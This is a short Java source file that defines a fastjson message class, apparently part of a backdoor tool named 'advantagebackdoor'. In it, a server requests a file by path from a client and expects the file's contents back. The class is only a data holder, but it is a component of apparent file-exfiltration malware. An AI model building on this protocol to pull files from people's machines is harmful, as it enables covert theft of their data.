package me.faintcloudy.advantagebackdoor.api.message.play.server;

import com.alibaba.fastjson.annotation.JSONField;
import me.faintcloudy.advantagebackdoor.api.message.play.client.ClientFileMessage;

public class ClientFileRequestMessage extends RequestMessage {
    @JSONField
    public String file;
    public ClientFileRequestMessage(String file)
    {
        super(ClientFileMessage.class);
        this.file = file;
    }

    public ClientFileRequestMessage() {}
}
